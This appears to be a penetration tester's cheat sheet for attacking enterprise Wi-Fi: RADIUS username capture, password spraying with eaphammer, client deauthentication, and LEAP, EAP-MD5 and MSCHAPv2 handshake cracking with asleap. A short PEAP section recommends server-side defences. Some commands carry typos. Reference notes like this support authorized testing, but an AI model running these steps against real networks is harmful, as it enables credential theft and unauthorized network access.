RADIUS Usernames Capture - Only possible when RADIUS Identity is sent in cleartext (EAP-MD5, LEAP, sometimes in weak config of other methods)
  Wireshark > "Identity" field into EAP Message of type "Response, Identity"
  $ python crEAP.py -i mon0 -c <channel>

RADIUS Accounts Bruteforce / Password Spraying
  $ eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \ --essid <target_ESSID> --password <password_to_spray> --user-list <usernames_list>

LEAP & EAP-MD5 Handshake Capture & Cracking - LEAP & EAP-MD5 are old deprecated EAP methods that transmit client authentication (challenge/ response) in cleartext
  1. Check and Confirm whether WLAN is protected by LEAP Encryption or not.
  2. De-authenticate the LEAP Protected Client using tools such as karma, hotspotter, etc.
  3. If the client is De authenticated then break the LEAP Encryption using a tool such as asleap to steal the confidential information
  4. If the process dropped then de-authenticate again

      $ airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0
      $ eapmd5pass r <capture> -w <wordlist>
        (For EAP-MD5)
      
      $ asleap –r <capture> -W <wordlist>
        (For LEAP (crack MSCHAPv2 challenge/response)

MSCHAPv2 Challenge / Response Capture (via Rogue AP) & Cracking - Possible when EAP method is using MSCHAPv2 for client authentication (e.g. PEAPv0(MSCHAPv2), EAPTTLS(MSCHAPv2))
  $ asleap -C  <mschapv2_challenge> -R <mschapv2_response> -W <wordlist>
      (Challenge/response colon-delimited format)

### Protected Extensible Authentication Protocol (PEAP) Authentication Attack - PEAP, a commonly used security protocol, is often used along with WPA and WPA2 wireless networks in Enterprise mode. Users can leverage unique authentication credentials, such as username and password, to access the network. An attacker monitors the network traffic to obtain a list of valid usernames. For each valid username, an attacker can attempt to log in and guess for weak passwords or conduct a password spraying attack.
Recommendation:
A helpful approach to preventing PEAP authentication attacks is configuring authentication servers to silently ignore incorrect passwords instead of sending a rejection message, increasing the time the attacker has to wait between password guesses. In addition to ignoring incorrect password submissions, configure an account lockout policy that will lock the account after a certain number of unsuccessful login attempts to prevent unauthorized access.
